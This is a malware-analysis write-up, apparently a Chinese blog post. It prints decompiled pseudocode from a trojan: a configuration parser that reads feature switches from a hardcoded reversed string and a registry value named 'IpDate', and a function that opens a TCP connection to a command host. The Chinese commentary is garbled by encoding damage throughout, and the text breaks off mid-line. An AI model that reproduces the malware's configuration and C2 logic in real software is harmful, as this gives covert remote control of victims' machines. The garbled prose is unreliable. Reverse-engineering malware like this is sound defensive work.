rbx int v72; // eax int v73; // r9d __int64 v74; // rdx int v75; // r10d __int64 i1; // r8 int v77; // ecx __int64 v78; // rbx int v79; // eax int v80; // r9d __int64 v81; // rdx int v82; // r10d __int64 i2; // r8 __int64 v84; // rbx int v85; // eax int v86; // r9d __int64 v87; // rdx int v88; // r10d __int64 i3; // r8 int v90; // ecx int v91; // ecx __int64 v92; // rbx int v93; // r9d __int64 v94; // rdx __int64 v95; // rsi int v96; // r10d __int64 v97; // r8 int v98; // ecx _UNKNOWN *retaddr; // [rsp+68h] [rbp+0h] BYREF DWORD cbData; // [rsp+70h] [rbp+8h] BYREF DWORD Type; // [rsp+78h] [rbp+10h] BYREF HKEY hKey; // [rsp+80h] [rbp+18h] BYREF v0 = &amp;retaddr; if ( !byte_140060708 ) { byte_140060708 = 1; wcsrev(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; memset(&amp;Src, 0, 0x12A0u); sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v1 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v2 = lstrlenW(L&quot;t1:&quot;); v3 = 0; v4 = 0; if ( (int)v1 &gt; 0 ) { while ( 1 ) { v5 = 0; for ( i = 0; i &lt; v2; ++v5 ) { if ( a0Db0Lk0Hs0Ld0L[v4 + i] != aT1[i] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i; } if ( v5 == v2 ) { v4 += v2; v3 += v2; if ( v4 &lt; v1 ) break; }LABEL_10: ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_15; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v4] != 124 ) { ++v4; ++v3; if ( v4 &gt;= v1 ) goto LABEL_10; } v7 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v3 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v7 = 1; dword_14005F6A8 = v7; }LABEL_15: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v8 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v9 = lstrlenW(L&quot;t2:&quot;); v10 = 0; v11 = 0; if ( (int)v8 &gt; 0 ) { while ( 1 ) { v12 = 0; for ( j = 0; j &lt; v9; ++v12 ) { if ( a0Db0Lk0Hs0Ld0L[v11 + j] != aT2[j] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++j; } if ( v12 == v9 ) { v11 += v9; v10 += v9; if ( v11 &lt; v8 ) break; }LABEL_23: ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_28; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v11] != 124 ) { ++v11; ++v10; if ( v11 &gt;= v8 ) goto LABEL_23; } v14 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v10 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v14 = 1; dword_14005F8E8 = v14; }LABEL_28: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v15 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v16 = lstrlenW(L&quot;t3:&quot;); v17 = 0; v18 = 0; if ( (int)v15 &gt; 0 ) { while ( 1 ) { v19 = 0; for ( k = 0; k &lt; v16; ++v19 ) { if ( a0Db0Lk0Hs0Ld0L[v18 + k] != aT3[k] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++k; } if ( v19 == v16 ) { v18 += v16; v17 += v16; if ( v18 &lt; v15 ) break; }LABEL_36: ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_41; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v18] != 124 ) { ++v18; ++v17; if ( v18 &gt;= v15 ) goto LABEL_36; } v21 = dword_14005FB28; if ( a0Db0Lk0Hs0Ld0L[v17 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v21 = 1; dword_14005FB28 = v21; }LABEL_41: sub_140008620(L&quot;dd:&quot;, &amp;Destination__0); sub_140008620(L&quot;cl:&quot;, &amp;Destination__1); sub_140008620(L&quot;fz:&quot;, &amp;unk_14005FBA4); sub_140008620(L&quot;bb:&quot;, &amp;unk_14005FC08); sub_140008620(L&quot;bz:&quot;, &amp;unk_14005FC6C); v22 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v23 = lstrlenW(L&quot;jp:&quot;); v24 = 0; v25 = 0; if ( (int)v22 &gt; 0 ) { while ( 1 ) { v26 = 0; for ( m = 0; m &lt; v23; ++v26 ) { if ( a0Db0Lk0Hs0Ld0L[v25 + m] != aJp[m] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++m; } if ( v26 == v23 ) { v25 += v23; v24 += v23; if ( v25 &lt; v22 ) break; }LABEL_49: ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_54; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v25] != 124 ) { ++v25; ++v24; if ( v25 &gt;= v22 ) goto LABEL_49; } v28 = dword_14005FCD0; if ( a0Db0Lk0Hs0Ld0L[v24 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v28 = 1; dword_14005FCD0 = v28; }LABEL_54: v29 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v30 = lstrlenW(L&quot;sx:&quot;); v31 = 0; v32 = 0; if ( (int)v29 &gt; 0 ) { while ( 1 ) { v33 = 0; for ( n = 0; n &lt; v30; ++v33 ) { if ( a0Db0Lk0Hs0Ld0L[v32 + n] != aSx[n] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++n; } if ( v33 == v30 ) { v32 += v30; v31 += v30; if ( v32 &lt; v29 ) break; }LABEL_62: ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_67; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v32] != 124 ) { ++v32; ++v31; if ( v32 &gt;= v29 ) goto LABEL_62; } v35 = dword_14005FCD4; if ( a0Db0Lk0Hs0Ld0L[v31 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v35 = 1; dword_14005FCD4 = v35; }LABEL_67: v36 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v37 = lstrlenW(L&quot;bh:&quot;); v38 = 0; v39 = 0; if ( (int)v36 &gt; 0 ) { while ( 1 ) { v40 = 0; for ( ii = 0; ii &lt; v37; ++v40 ) { if ( a0Db0Lk0Hs0Ld0L[v39 + ii] != aBh[ii] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++ii; } if ( v40 == v37 ) { v39 += v37; v38 += v37; if ( v39 &lt; v36 ) break; }LABEL_75: ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_80; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v39] != 124 ) { ++v39; ++v38; if ( v39 &gt;= v36 ) goto LABEL_75; } v42 = dword_14005FCD8; if ( a0Db0Lk0Hs0Ld0L[v38 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v42 = 1; dword_14005FCD8 = v42; }LABEL_80: v43 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v44 = lstrlenW(L&quot;ll:&quot;); v45 = 0; v46 = 0; if ( (int)v43 &gt; 0 ) { while ( 1 ) { v47 = 0; for ( jj = 0; jj &lt; v44; ++v47 ) { if ( a0Db0Lk0Hs0Ld0L[v46 + jj] != aLl[jj] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++jj; } if ( v47 == v44 ) { v46 += v44; v45 += v44; if ( v46 &lt; v43 ) break; }LABEL_88: ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_93; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v46] != 124 ) { ++v46; ++v45; if ( v46 &gt;= v43 ) goto LABEL_88; } v49 = dword_14005FCDC; if ( a0Db0Lk0Hs0Ld0L[v45 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v49 = 1; dword_14005FCDC = v49; }LABEL_93: v50 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v51 = lstrlenW(L&quot;dl:&quot;); v52 = 0; v53 = 0; if ( (int)v50 &gt; 0 ) { while ( 1 ) { v54 = 0; for ( kk = 0; kk &lt; v51; ++v54 ) { if ( a0Db0Lk0Hs0Ld0L[v53 + kk] != aDl[kk] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++kk; } if ( v54 == v51 ) { v53 += v51; v52 += v51; if ( v53 &lt; v50 ) break; }LABEL_101: ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_106; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v53] != 124 ) { ++v53; ++v52; if ( v53 &gt;= v50 ) goto LABEL_101; } v56 = dword_14005FCE0; if ( a0Db0Lk0Hs0Ld0L[v52 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v56 = 1; dword_14005FCE0 = v56; }LABEL_106: v57 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v58 = lstrlenW(L&quot;sh:&quot;); v59 = 0; v60 = 0; if ( (int)v57 &gt; 0 ) { while ( 1 ) { v61 = 0; for ( mm = 0; mm &lt; v58; ++v61 ) { if ( a0Db0Lk0Hs0Ld0L[v60 + mm] != aSh[mm] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++mm; } if ( v61 == v58 ) { v60 += v58; v59 += v58; if ( v60 &lt; v57 ) break; }LABEL_114: ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_119; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v60] != 124 ) { ++v60; ++v59; if ( v60 &gt;= v57 ) goto LABEL_114; } v63 = dword_14005FCE4; if ( a0Db0Lk0Hs0Ld0L[v59 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v63 = 1; dword_14005FCE4 = v63; }LABEL_119: v64 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v65 = lstrlenW(L&quot;kl:&quot;); v66 = 0; v67 = 0; if ( (int)v64 &gt; 0 ) { while ( 1 ) { v68 = 0; for ( nn = 0; nn &lt; v65; ++v68 ) { if ( a0Db0Lk0Hs0Ld0L[v67 + nn] != aKl[nn] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++nn; } if ( v68 == v65 ) { v67 += v65; v66 += v65; if ( v67 &lt; v64 ) break; }LABEL_127: ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_132; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v67] != 124 ) { ++v67; ++v66; if ( v67 &gt;= v64 ) goto LABEL_127; } v70 = dword_14005FCE8; if ( a0Db0Lk0Hs0Ld0L[v66 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v70 = 1; dword_14005FCE8 = v70; }LABEL_132: v71 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v72 = lstrlenW(L&quot;bd:&quot;); v73 = 0; v74 = 0; if ( (int)v71 &gt; 0 ) { while ( 1 ) { v75 = 0; for ( i1 = 0; i1 &lt; v72; ++v75 ) { if ( a0Db0Lk0Hs0Ld0L[v74 + i1] != aBd[i1] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i1; } if ( v75 == v72 ) { v74 += v72; v73 += v72; if ( v74 &lt; v71 ) break; }LABEL_140: ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_145; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v74] != 124 ) { ++v74; ++v73; if ( v74 &gt;= v71 ) goto LABEL_140; } v77 = dword_14005FCEC; if ( a0Db0Lk0Hs0Ld0L[v73 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v77 = 1; dword_14005FCEC = v77; }LABEL_145: Type = 3; cbData = 0; LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); if ( cbData &gt; 0xA ) { memset(a0Db0Lk0Hs0Ld0L, 0, 0x7D0u); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; sub_140008620(L&quot;p1:&quot;, &amp;Source); sub_140008620(L&quot;o1:&quot;, &amp;Source__1); v78 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v79 = lstrlenW(L&quot;t1:&quot;); v80 = 0; v81 = 0; if ( (int)v78 &gt; 0 ) { while ( 1 ) { v82 = 0; for ( i2 = 0; i2 &lt; v79; ++v82 ) { if ( a0Db0Lk0Hs0Ld0L[v81 + i2] != aT1[i2] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i2; } if ( v82 == v79 ) { v81 += v79; v80 += v79; if ( v81 &lt; v78 ) break; }LABEL_156: ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_157; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v81] != 124 ) { ++v81; ++v80; if ( v81 &gt;= v78 ) goto LABEL_156; } v90 = dword_14005F6A8; if ( a0Db0Lk0Hs0Ld0L[v80 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v90 = 1; dword_14005F6A8 = v90; }LABEL_157: sub_140008620(L&quot;p2:&quot;, &amp;Source_); sub_140008620(L&quot;o2:&quot;, &amp;Source__0); v84 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v85 = lstrlenW(L&quot;t2:&quot;); v86 = 0; v87 = 0; if ( (int)v84 &gt; 0 ) { while ( 1 ) { v88 = 0; for ( i3 = 0; i3 &lt; v85; ++v88 ) { if ( a0Db0Lk0Hs0Ld0L[v87 + i3] != aT2[i3] )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++i3; } if ( v88 == v85 ) { v87 += v85; v86 += v85; if ( v87 &lt; v84 ) break; }LABEL_165: ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_173; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v87] != 124 ) { ++v87; ++v86; if ( v87 &gt;= v84 ) goto LABEL_165; } v91 = dword_14005F8E8; if ( a0Db0Lk0Hs0Ld0L[v86 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v91 = 1; dword_14005F8E8 = v91; }LABEL_173: sub_140008620(L&quot;p3:&quot;, &amp;Source__2); sub_140008620(L&quot;o3:&quot;, &amp;Source__3); v92 = lstrlenW(a0Db0Lk0Hs0Ld0L); // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; LODWORD(v0) = lstrlenW(L&quot;t3:&quot;); v93 = 0; v94 = 0; v95 = (int)v0; if ( (int)v92 &gt; 0 ) { while ( 1 ) { v96 = 0; v97 = 0; if ( (int)v95 &gt; 0 ) { do { LODWORD(v0) = aT3[v97]; if ( a0Db0Lk0Hs0Ld0L[v94 + v97] != (_WORD)v0 )// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; break; ++v97; ++v96; } while ( v97 &lt; v95 ); } if ( v96 == (_DWORD)v95 ) { v94 += v95; v93 += v95; if ( v94 &lt; v92 ) break; }LABEL_181: ++v94; ++v93; if ( v94 &gt;= v92 ) return (int)v0; } // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; while ( a0Db0Lk0Hs0Ld0L[v94] != 124 ) { ++v94; ++v93; if ( v94 &gt;= v92 ) goto LABEL_181; } v98 = dword_14005FB28; LODWORD(v0) = v93; if ( a0Db0Lk0Hs0Ld0L[v93 - 1] == 49 ) // &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; v98 = 1; dword_14005FB28 = v98; } } } return (int)v0;} 1.æ‰“å¼€æ³¨å†Œè¡¨é”® (Open Key)è¿™ä¸€è¡Œå°è¯•æ‰“å¼€ HKEY_CURRENT_USER\\Console é”®ï¼š 1LODWORD(v0) = RegOpenKeyExW(HKEY_CURRENT_USER, L&quot;Console&quot;, 0, 0x20019u, &amp;hKey); 2.ç¬¬ä¸€æ¬¡æŸ¥è¯¢å€¼ (Query Value - Get Size)å¦‚æœæ‰“å¼€æˆåŠŸï¼Œè¿™ä¸€è¡ŒæŸ¥è¯¢ IpDate å€¼çš„æ•°æ®å¤§å° (cbData)ï¼Œä½†ä¸è¯»å–æ•°æ®ï¼š 12if ( !(_DWORD)v0 ) LODWORD(v0) = RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, 0, &amp;cbData); 3.ç¬¬äºŒæ¬¡æŸ¥è¯¢å€¼ (Query Value - Read Data) å¦‚æœç¬¬ä¸€æ¬¡æŸ¥è¯¢æ˜¾ç¤ºæ•°æ®å¤§å°å¤§äº 0xAï¼Œåˆ™è¿›å…¥è¿™æ®µä»£ç ï¼Œè¿™ä¸€è¡Œå®é™…è¯»å–äº† IpDate çš„æ•°æ® åˆ°å­—ç¬¦ä¸² a0Db0Lk0Hs0Ld0L ä¸­ï¼š 1RegQueryValueExW(hKey, L&quot;IpDate&quot;, 0, &amp;Type, (LPBYTE)a0Db0Lk0Hs0Ld0L, &amp;cbData);// &quot;|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|&quot; æ³¨å†Œè¡¨ç¡®å®æœ‰ä¸œè¥¿ä½†æ˜¯æˆ‘ç°åœ¨ä¹Ÿä¸çŸ¥é“è¿™ä¸ªæ˜¯å¹²å•¥ç”¨çš„è§£ç åå°±åªæœ‰è¿™ä¸ªIpdatetime(9-27-1-25-18) è¿™ä¸ªå‡½æ•° sub_140008750 æ˜¯ æœ¨é©¬çš„é…ç½®è§£æåˆå§‹åŒ–å‡½æ•°ï¼Œæ ¸å¿ƒä½œç”¨æ˜¯ï¼šä»ã€Œå†…ç½®ç¡¬ç¼–ç å­—ç¬¦ä¸²ã€æˆ–ã€ŒWindows æ³¨å†Œè¡¨ã€ä¸­è¯»å–é…ç½®ä¿¡æ¯ï¼Œè§£æåè®¾ç½®ä¸€ç³»åˆ—åŠŸèƒ½å¼€å…³ï¼ˆå…¨å±€å˜é‡ï¼‰ï¼Œä»…åœ¨ç¨‹åºå¯åŠ¨æ—¶æ‰§è¡Œä¸€æ¬¡ï¼ˆé€šè¿‡æ ‡å¿—ä½æ§åˆ¶ï¼‰é»‘å®¢æ¤å…¥çš„æ¶æ„ç¨‹åºä¸­ã€Œè¯»å–æ§åˆ¶é…ç½®ã€çš„æ¨¡å—ï¼Œè§£ææ˜¯å¦å¯ç”¨è¿œæ§ã€æ•°æ®ä¸Šä¼ ã€ç«¯å£è½¬å‘ç­‰åŠŸèƒ½çš„å¼€å…³ ä¸Šé¢å›¾ç‰‡â€|0:db|0:lk|0:hs|0:ld|0:ll|0:hb|0:pj|9 .11.5202:zb|0.1:bb|â€è¿™é‡Œå¯ä»¥å¾—åˆ°5202æ˜¯æ··æ·†åçš„æ—¶é—´å°±æ˜¯2025å¹´11æœˆ9æ—¥ æŸ¥çœ‹sub_140003390å‡½æ•°çš„åç¼–è¯‘ç»“æœ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889char __fastcall cyber(char *ArgList, LPCWCH lpWideCharStr, u_short hostshort){ // ArgList: æŒ‡å‘ä¸€ä¸ªç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç”¨äºå­˜å‚¨è¿æ¥çŠ¶æ€å’Œå¥æŸ„ã€‚ // lpWideCharStr: æŒ‡å‘å®½å­—ç¬¦å­—ç¬¦ä¸² (Unicode)ï¼ŒåŒ…å«ç›®æ ‡ HOSTNAMEï¼ˆä¸»æœºåï¼‰ã€‚ // hostshort: ç›®æ ‡ PORTï¼ˆç«¯å£å·ï¼‰ï¼Œä¸ºä¸»æœºå­—èŠ‚åºã€‚ SOCKET v6; // ç”¨äºå­˜å‚¨æ–°çš„å¥—æ¥å­—å¥æŸ„ // ... å…¶ä»–å±€éƒ¨å˜é‡ // --- çŠ¶æ€åˆå§‹åŒ–å’Œé‡ç½® --- ResetEvent(*((HANDLE *)ArgList + 1)); // é‡ç½® ArgList ç»“æ„ä½“ä¸­çš„ä¸€ä¸ªåŒæ­¥äº‹ä»¶å¥æŸ„ _InterlockedExchange((volatile __int32 *)ArgList + 8, 0); // åŸå­åœ°è®¾ç½® ArgList ä¸­åç§»é‡ +8 å¤„çš„æ ‡å¿—ä¸º 0 (ä¾‹å¦‚ï¼šè¿æ¥çŠ¶æ€ä¸ºâ€œæ­£åœ¨è¿æ¥â€) *((_DWORD *)ArgList + 7) = timeGetTime(); // è®°å½•å½“å‰æ—¶é—´ (åç§»é‡ +7) // ... ArgList ç»“æ„ä½“çš„å…¶ä»–åˆå§‹åŒ–å’Œè®¾ç½® // --- 1. åˆ›å»ºå¥—æ¥å­— (Socket) --- v6 = socket(2, 1, 6); // åˆ›å»ºæ–°çš„å¥—æ¥å­—ï¼šAF_INET (2, IPv4), SOCK_STREAM (1, TCPæµ), IPPROTO_TCP (6) -&gt; TCP/IPv4 *((_QWORD *)ArgList + 22) = v6; // å°†æ–°çš„å¥—æ¥å­—å¥æŸ„å­˜å‚¨åœ¨ ArgList ç»“æ„ä½“çš„åç§»é‡ +22 å¤„ if ( v6 == -1 ) // æ£€æŸ¥å¥—æ¥å­—åˆ›å»ºæ˜¯å¦å¤±è´¥ return 0; // --- 2. è½¬æ¢ä¸»æœºå (å®½å­—ç¬¦åˆ°å¤šå­—èŠ‚) --- cchWideChar = lstrlenW(lpWideCharStr); // è·å–å®½å­—ç¬¦ä¸»æœºåå­—ç¬¦ä¸²çš„é•¿åº¦ // ç¡®å®šå¤šå­—èŠ‚å­—ç¬¦ä¸²æ‰€éœ€çš„ç¼“å†²åŒºå¤§å° cbMultiByte_1 = WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar, 0, 0, 0, 0); cbMultiByte = cbMultiByte_1; lpMultiByteStr = (CHAR *)operator new(cbMultiByte_1 + 1); // åˆ†é…å†…å­˜ç”¨äºå¤šå­—èŠ‚å­—ç¬¦ä¸² (+1 ç”¨äºç©ºç»ˆæ­¢ç¬¦) cchWideChar_1 = lstrlenW(lpWideCharStr); // æ‰§è¡Œå®é™…çš„è½¬æ¢ï¼šä»å®½å­—ç¬¦åˆ°å¤šå­—èŠ‚ WideCharToMultiByte(0, 0, lpWideCharStr, cchWideChar_1, lpMultiByteStr, cbMultiByte, 0, 0); lpMultiByteStr[cbMultiByte] = 0; // ç©ºç»ˆæ­¢å¤šå­—èŠ‚å­—ç¬¦ä¸² // --- 3. è§£æä¸»æœºååˆ° IP åœ°å€ (DNS Lookup) --- hostbyname = gethostbyname(lpMultiByteStr); // æ‰§è¡Œ DNS æŸ¥è¯¢ï¼Œå°†ä¸»æœºåè§£æä¸º IP åœ°å€ j_free(lpMultiByteStr); // é‡Šæ”¾åˆ†é…çš„å¤šå­—èŠ‚å­—ç¬¦ä¸²ç¼“å†²åŒº if ( !hostbyname ) // æ£€æŸ¥ DNS è§£ææ˜¯å¦å¤±è´¥ return 0; // --- 4. å‡†å¤‡ç›®æ ‡åœ°å€ç»“æ„ä½“ (sockaddr_in) --- name.sa_family = 2; // è®¾ç½®åœ°å€æ—ä¸º AF_INET (IPv4) // è®¾ç½®ç«¯å£å·ï¼šå°† hostshort (ä¸»æœºå­—èŠ‚åº) è½¬æ¢ä¸ºç½‘ç»œå­—èŠ‚åº *(_WORD *)name.sa_data = htons(hostshort); s = *((_QWORD *)ArgList + 22); // è·å–å¥—æ¥å­—å¥æŸ„ // è®¾ç½® IP åœ°å€ï¼šè·å– h_addr_list æŒ‡é’ˆæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªåœ°å€ *(_DWORD *)&amp;name.sa_data[2] = **(_DWORD **)hostbyname-&gt;h_addr_list; // --- 5. å»ºç«‹è¿æ¥ (TCP Handshake) --- if ( connect(s, &amp;name, 16) == -1 ) // å°è¯•å»ºç«‹ TCP è¿æ¥ return 0; // --- 6. é…ç½®å¥—æ¥å­—é€‰é¡¹ (setsockopt) --- // è®¾ç½® SO_RCVBUF (æ¥æ”¶ç¼“å†²åŒºå¤§å°, 4097) ä¸º 0x40000 (256 KB) s_1 = *((_QWORD *)ArgList + 22); *(_DWORD *)optval = 